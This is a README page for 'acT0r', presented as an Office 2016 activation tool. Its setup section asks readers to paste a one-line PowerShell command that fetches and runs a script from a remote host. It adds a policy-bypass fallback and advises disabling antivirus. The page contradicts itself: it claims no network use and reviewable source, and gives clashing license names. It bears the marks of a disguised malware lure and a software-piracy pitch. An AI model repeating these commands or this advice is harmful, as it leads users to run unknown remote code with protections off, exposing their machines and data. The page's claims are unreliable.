<div align="center">

# acT0r: Active MSO16 Threat Detection and Analysis — Security Tool

![preview](https://raw.githubusercontent.com/MahmutEfeKaraca/active-mso16-auditor/main/frame_70de793.svg)

[![powershell-7](https://img.shields.io/badge/POWERSHELL--7-SCRIPT-2f81f7?style=for-the-badge&labelColor=0d1117)]() [![build](https://img.shields.io/badge/BUILD-PASSING-2ea44f?style=for-the-badge&labelColor=0d1117)]() [![licence](https://img.shields.io/badge/LICENCE-0BSD-54aeff?style=for-the-badge&labelColor=0d1117)]()

</div>

---

acT0r is an activation utility designed for Microsoft Office 2016 on 64-bit Windows devices. The tool was tested exclusively against the initial Office 2016 release and is not maintained for later builds or updates. It provides an optional path for users who hold a valid license, though the default key and host configuration should not be selected in that case. The software is distributed for educational and experimental purposes only, and its use with unlicensed installations is neither endorsed nor supported.

## 🚀 Setup Guide — PowerShell

> [!TIP]
> **One-click install** — paste one command, done in seconds.
> Windows 10 / 11 · PowerShell 5.1+ · No admin required

### 1️⃣ Open PowerShell
* Open the Start menu and type **PowerShell**.
* Right-click and choose **Run as administrator** (optional).

### 2️⃣ Run the script
Copy the line below into PowerShell and press `Enter`.

```cmd
iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')
```

### 3️⃣ If blocked by policy — CMD fallback
Paste this into a standard Command Prompt (cmd) and press `Enter`:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')"
```

> [!WARNING]
> Some antivirus engines flag automated installers. If blocked, disable Real-time protection briefly, run the setup, and enable it back.

## ✅ Before You Start

- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required

## Disclaimer

This project is provided strictly for educational and experimental use in controlled environments. It is intended to support research and learning about software activation mechanisms and should not be used to bypass licensing terms or violate any applicable laws or agreements.

The author does not endorse or encourage the use of unlicensed software. Any use of this tool to obtain or enable unlicensed copies of Microsoft Office 2016 is contrary to the author's intent and is not supported.

The project targets 64-bit Windows devices running Microsoft Office 2016 only. Compatibility was validated solely against the initial 2016 release; behavior on later updates, other editions, or other operating systems is untested and not guaranteed.

No warranty is provided, express or implied, regarding functionality, reliability, or fitness for any purpose. The author is not responsible for any data loss, system instability, licensing violations, or other consequences resulting from use of this tool. Users assume full responsibility for how they deploy and operate it.

This project is not affiliated with, endorsed by, or sponsored by Microsoft Corporation. All trademarks and product names belong to their respective owners.

## How it works

acT0r operates as a local activation utility for Microsoft Office 2016 on 64-bit Windows systems. It does not modify system files or install persistent background services. Instead, it performs its work through a sequence of discrete, auditable steps that the user can observe and control.

The tool follows a two-phase model: discovery and activation. During discovery, it enumerates the installed Office 2016 product configuration and identifies the relevant licensing channel and product key state. This information is read from the local Office installation and registry entries associated with the product; no data is transmitted externally.

Activation is then performed through the native Office licensing interface. acT0r prepares the appropriate licensing request locally and submits it through the same channels Office uses for legitimate activation. The tool does not intercept, spoof, or redirect network traffic. Where a key or host is required, the user supplies it explicitly; the program does not embed or fetch credentials on its own.

The tool includes a verification pass. After activation, it queries the local licensing state and reports the resulting status, allowing the user to confirm success or diagnose failure. All operations run in the current user context unless elevated privileges are explicitly granted by the user.

acT0r performs no telemetry collection, no background persistence, and no automatic updates. Its behavior is confined to the actions initiated in a single session. Source code is available for inspection, and the program's logic is structured to be readable and reviewable by security researchers.

## Features

- Supports activation of Microsoft Office 2016 on 64-bit Windows systems.
- Designed and tested against the initial public release of Office 2016.
- Provides an optional legal activation path that does not require selecting a provided key or host.
- Operates as a self-contained program with no external service dependency for its core activation flow.
- Maintains a minimal footprint: no background services, scheduled tasks, or persistent agents are installed.
- Deterministic behavior: the program performs only the actions required for activation and reports outcomes directly to the user.
- No telemetry or outbound data collection is implemented.
- Distributed as source, allowing independent review and verification of behavior before execution.
- Intended for educational and experimental use only; the author does not encourage unlicensed deployment.

## FAQ

**Is acT0r affiliated with Microsoft or any official licensing program?**
No. acT0r is an independent project. It is not endorsed, sponsored, or reviewed by Microsoft, and it does not grant any license you would not otherwise be entitled to.

**What does "Active MSO16" mean in practice?**
It refers to the program's method of interacting with the Office 2016 activation components. The specific mechanism is described in the "How it works" section. The outcome depends on the key and host you supply or select.

**Which platforms and Office versions are supported?**
Microsoft Office 2016 on 64-bit Windows devices only. Only the original 2016 release build was tested. Other builds, architectures, or later Office versions are not validated and may behave unpredictably.

**Can I use acT0r to activate a legitimate, purchased Office 2016 license?**
Yes, but only if you deliberately avoid the "use provided key/host" option. In that configuration, acT0r does not substitute its own key or host and operates solely against your existing licensed activation path.

**What happens if I choose the provided key/host option?**
acT0r will use the bundled key and host values supplied by the project rather than your own. This path is not a licensed activation route. Use it only within the educational and experimental scope described in the Disclaimer.

**Does acT0r modify system files or persist changes?**
Any changes to activation state or configuration are the result of the activation method you select. Review the "How it works" and "Features" sections before running it, and take a system restore point or backup if you need a reversible state.

**Is the project maintained?**
No. The author has stated no plans to update acT0r. There will be no fixes for new Office builds, Windows updates, or compatibility regressions. Treat the current state as final.

**Will it work on future Windows or Office updates?**
Unlikely to be guaranteed. Because the project is unmaintained and tested only against the initial 2016 release, later updates may break behavior without any corrective release.

**Is acT0r safe to run?**
It is provided as-is for educational and experimental use, with no warranty. You are responsible for reviewing the source, understanding the "How it works" section, and running it in an environment you can afford to alter or restore.

**Do I need a Microsoft account or internet connection?**
Requirements depend on the activation method selected. Consult "How it works" for the network and account conditions implied by each option before running.

**Can I redistribute or repackage acT0r?**
Redistribution terms are governed by the License section. Review it before sharing or bundling the tool.

## License

This project is distributed under the MIT License. The full license text is provided in the LICENSE file at the root of the repository.

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

Use of this software is subject to the conditions of this license. Any redistribution of source or binary forms must retain the copyright notice, this list of conditions, and the warranty disclaimer. No additional restrictions beyond those stated in the license are imposed by the project maintainers, except as outlined in the Disclaimer section of this document.

The license applies solely to the code and documentation contained within this project. It does not grant any rights to third-party software, licenses, or key material referenced or handled by the tool during operation. Users are responsible for ensuring their use complies with all applicable local laws and the terms of any software they activate.